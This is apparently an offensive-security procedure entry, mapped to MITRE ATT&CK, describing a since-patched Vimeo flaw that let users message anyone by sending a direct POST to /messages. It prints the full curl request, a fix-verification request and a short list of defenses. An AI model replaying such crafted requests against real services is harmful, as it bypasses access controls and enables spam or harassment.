---
id: proc-vimeo-auth-bypass-001
tags:
  - auth-bypass
  - vimeo
  - web
  - messaging
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/vimeo-send-unauthorized-message-post]]'
  - '[[commands/vimeo-verify-fix-401]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:28:58.818Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Bypass-Vimeo-Messaging-Authorization-with-POST-Request

## Summary

This procedure exploits a vulnerability in Vimeo's messaging system by sending a direct POST request to the /messages endpoint, bypassing the anti-spam requirement to follow at least one user before messaging others. It allows attackers to send private messages to arbitrary users, potentially for spam or harassment.

## Description

The vulnerability stems from missing server-side authorization checks on the /messages endpoint. Normally, Vimeo's client-side enforces following a user before messaging, but a crafted POST request with form data including an arbitrary user ID succeeds without validation. This was reported in HackerOne report #46113. The attack requires an authenticated session but no prior relationships. Expected outcomes include successful message delivery, enabling unauthorized communications. Post-fix, attempts return 401 Unauthorized.

## Requirements

1. Authenticated Vimeo session (valid cookies and CSRF token)
2. Knowledge of target user ID (discoverable via Vimeo profiles)
3. Tool for sending HTTP POST requests (e.g., curl, Burp Suite)
4. Network access to vimeo.com

## Defense

Defensive measures and detection strategies:

- Implement server-side checks to verify user relationships before message processing
- Rate-limit messaging endpoints and monitor for anomalous POST patterns
- Use CSRF tokens effectively and validate referer headers
- Log and alert on direct endpoint accesses without UI navigation

## Objectives

1. Send private messages to any Vimeo user without following restrictions
2. Demonstrate authorization bypass for spam potential
3. Verify fix by observing 401 responses post-patch

## Instructions

### Step 1: Prepare the Request

**Context**: Gather session details and craft the form data for the unauthorized message.

Extract your session cookie and CSRF token from a logged-in Vimeo session via browser dev tools. Identify the target user ID from their profile URL.

### Step 2: Execute the Bypass

**Context**: Send the POST request to deliver the message without authorization checks.

**Command** ([[commands/vimeo-send-unauthorized-message-post]]):
```bash
curl -X POST https://vimeo.com/messages \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Accept-Encoding: gzip, deflate" \
  -H "Content-Type: application/x-www-form-urlencoded; charset=utf-8" \
  -H "Referer: https://vimeo.com/messages" \
  -H "Cookie: [YOUR_SESSION_COOKIE]" \
  -d "name=Jens>&text=blaat&action=send_message&lightbox=true&user=12345&token=[YOUR_CSRF_TOKEN]"
```

> This command sends a message with sender name 'Jens>', content 'blaat' to user ID 12345. Expected output is a 200 OK response with success indicators, such as redirected page or confirmation text. If successful, the message appears in the target's inbox.

### Step 3: Verify the Fix

**Context**: After patching, reattempt the request to confirm authorization enforcement.

**Command** ([[commands/vimeo-verify-fix-401]]):
```bash
curl -X POST https://vimeo.com/messages \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Accept-Encoding: gzip, deflate" \
  -H "Content-Type: application/x-www-form-urlencoded; charset=utf-8" \
  -H "Referer: https://vimeo.com/messages" \
  -H "Cookie: [YOUR_SESSION_COOKIE]" \
  -d "name=Jens>&text=blaat&action=send_message&lightbox=true&user=12345&token=[YOUR_CSRF_TOKEN]"
```

> Post-fix, expect a 401 Unauthorized response with JSON {"display_message":"You are unauthorized for this action."}, confirming the bypass is mitigated.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/vimeo-send-unauthorized-message-post]]
- [[commands/vimeo-verify-fix-401]]

## Tools Used


## Tags

- auth-bypass
- vimeo
- web
- messaging
